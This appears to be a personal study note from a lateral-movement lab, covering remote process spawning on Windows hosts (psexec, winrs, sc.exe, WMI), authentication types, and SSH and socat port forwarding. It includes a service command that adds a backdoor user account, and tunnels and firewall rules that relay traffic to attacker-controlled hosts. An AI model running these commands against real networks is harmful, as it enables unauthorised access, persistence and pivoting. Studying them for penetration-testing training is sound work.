---
dg-publish: true
---






## ==Steps Followed==

- Initial Reconnaissance
- Initial Compromise
- Establish Foothold
- Escalate Privileges
    - Internal Recon
    - Move Laterally
    - Maintain Presence
- Complete Mission

## ==Spawning Processes==

### ==Psexec==

```Shell
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### ==WinRM==

- Web based protocol used to send Powershell commands to Windows hosts remotely.

```Shell
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

- To achieve this, We need to create a PSCredential object

```Shell
$username = '';
$password = '';
$securePassword = '';
$credential = '';
```

### ==sc==

- Create a service on a remote host with sc.exe.

```Shell
sc.exe \\TARGET create THMService binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

sc.exe \\TARGET stop THMService
sc.exe \\TARGET delete THMService
```

## ==Windows Management Instrumentation==

- Create the same PSCredential object as earlier.
- Store the commands on the $Session variable
    
    ```Shell
    $Opt = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction
    ```
    

## ==Alternate Authentication==

### ==NTLM Auth==

![Untitled.jpeg](/img/user/img/Untitled.jpeg)

### ==Kerberos Auth==

- Kerberos operates on tickets, allowing nodes to securely prove identity.
- The protocol messages are protected against eavesdropping and replay attacks, and builds on symmetric-key cryptography.

## ==Port Forwarding==

### ==SSH Tunnelling==

- Create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels.

```Shell
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

### ==SSH Remote Port Forwarding==

- Allows to take a reachable port from the SSH client and project it into a remote SSH server.

```Shell
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

### ==SSH Local Port Forwarding==

- Allows to “pull” a port from an SSH server into the SSH client. Used to take any service available in attacker’s machine and make it available through ports on PC-1.

```Shell
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

- -L is used for defining Local.
- Need to add a firewall rule to allow for incoming connections.

```Shell
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

- Can be done with socat where SSH is not available.

```Shell
socat TCP4-LISTEN:3389, fork TCP4:3.3.3.3:3389
```

> socat cant forward the connection directly to attacker instead just opens a port there.

### ==Dynamic Port Forwarding==